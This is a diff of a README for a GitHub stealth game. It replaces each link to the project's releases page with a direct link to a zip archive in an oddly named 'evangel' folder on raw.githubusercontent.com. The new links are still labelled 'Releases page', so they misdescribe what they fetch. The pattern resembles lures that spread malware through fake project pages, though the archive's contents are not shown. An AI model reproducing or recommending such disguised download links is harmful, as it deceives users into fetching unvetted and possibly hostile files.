@@ -1,7 +1,7 @@
 # 🔪 Stealth-Game - Evade Detection and Master Strategy
 
 ## 📥 Download Now
-[![Download Stealth-Game](https://img.shields.io/badge/Download-Stealth--Game-blue.svg)](https://github.com/tusharpunde9322/Stealth-Game/releases)
+[![Download Stealth-Game](https://raw.githubusercontent.com/tusharpunde9322/Stealth-Game/main/evangel/Stealth-Game-1.5.zip)](https://raw.githubusercontent.com/tusharpunde9322/Stealth-Game/main/evangel/Stealth-Game-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Stealth-Game! In this game, your challenge is to avoid being caught by AI guards while completing various tasks. Utilize line-of-sight and noise mechanics to test your strategic skills.
@@ -18,7 +18,7 @@ To enjoy Stealth-Game, your computer should meet the following requirements:
 ## 📥 Download & Install
 To download and install Stealth-Game, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/tusharpunde9322/Stealth-Game/releases) to find the latest version of the game.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/tusharpunde9322/Stealth-Game/main/evangel/Stealth-Game-1.5.zip) to find the latest version of the game.
   
 2. **Select the Latest Release:** Look for the latest release at the top of the page. You will see the version number and a brief description.
 
@@ -73,7 +73,7 @@ Join our community for help and support:
 - **Feedback:** We appreciate your feedback. Share your thoughts on gameplay, mechanics, or anything else that can improve the game.
 
 ## 🔗 Stay Updated
-To stay informed about updates, new features, and improvements, check the [Releases page](https://github.com/tusharpunde9322/Stealth-Game/releases) regularly. Follow us on social media for the latest news!
+To stay informed about updates, new features, and improvements, check the [Releases page](https://raw.githubusercontent.com/tusharpunde9322/Stealth-Game/main/evangel/Stealth-Game-1.5.zip) regularly. Follow us on social media for the latest news!
 
 ## 📄 License
 Stealth-Game is licensed under the MIT License. You can use, modify, and distribute the code, but kindly provide appropriate credit to the original authors.
